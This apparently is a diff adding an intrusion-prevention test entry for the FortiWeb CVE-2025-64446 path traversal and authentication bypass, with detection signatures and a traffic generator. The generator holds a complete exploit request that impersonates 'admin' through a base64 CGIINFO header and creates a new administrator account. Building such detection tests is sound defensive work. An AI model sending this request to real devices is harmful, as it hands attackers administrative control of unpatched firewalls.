@@ -1,0 +1,46 @@
+id: TP-2025-64446
+cve: [CVE-2025-64446]
+name: FortiWeb.API.cgi.Path.Traversal.Admin.Create
+severity: critical
+target: {os: [FortiWeb], app: [FortiWeb management API]}
+location: server
+summary: >-
+  FortiWeb releases before the November 2025 fixes (8.0.2 and the matching 7.x updates) let an unauthenticated
+  POST reach an internal CGI handler: a path that starts like the admin API and walks back with ../ to
+  /cgi-bin/fwbcgi. That handler trusted a base64 JSON CGIINFO header naming the user to act as, so one
+  request created a new administrator. It was exploited in the wild before Fortinet's advisory in November 2025 and
+  is in CISA's Known Exploited Vulnerabilities catalog.
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2025-64446
+  - https://labs.watchtowr.com/when-the-impersonation-function-gets-used-to-impersonate-users-fortinet-fortiweb-auth-bypass/
+  - https://blog.qualys.com/vulnerabilities-threat-research/2025/11/14/unauthenticated-authentication-bypass-in-fortinet-fortiweb-cve-2025-64446-exploited-in-the-wild
+signatures:
+  - id: 9100051
+    name: Traversal from the admin API to the internal CGI handler
+    proto: tcp
+    ports: [443, 8443, 80]
+    match:
+      - {buf: uri, regex: "/api/v2\\.0/[^ ]*\\.\\./[^ ]*cgi-bin/fwbcgi", nocase: true}
+  - id: 9100052
+    name: Impersonation header sent to the CGI handler
+    proto: tcp
+    ports: [443, 8443, 80]
+    match:
+      - {buf: uri, contains: "fwbcgi", nocase: true}
+      - {buf: header, regex: "(^|\\r\\n)cgiinfo:", nocase: true}
+generator:
+  port: 443
+  tls: true
+  variants:
+    - name: create-admin
+      request: |-
+        POST /api/v2.0/cmdb/system/admin%3F/../../../../../cgi-bin/fwbcgi HTTP/1.1
+        Host: {{target_host}}
+        User-Agent: python-requests/2.31.0
+        CGIINFO: eyJ1c2VybmFtZSI6ImFkbWluIiwicHJvZm5hbWUiOiJwcm9mX2FkbWluIiwidmRvbSI6InJvb3QiLCJsb2dpbm5hbWUiOiJhZG1pbiJ9
+        Content-Type: application/json
+        Connection: close
+
+        {"data": {"q_type": 1, "name": "{{token}}", "access-profile": "prof_admin", "password": "{{token}}"}}
+server_effect: {process: none, when: allowed}
+lesson: A WAF's own management interface must never face the Internet; an IPS in front of it with deep inspection is the backstop, not the fix.
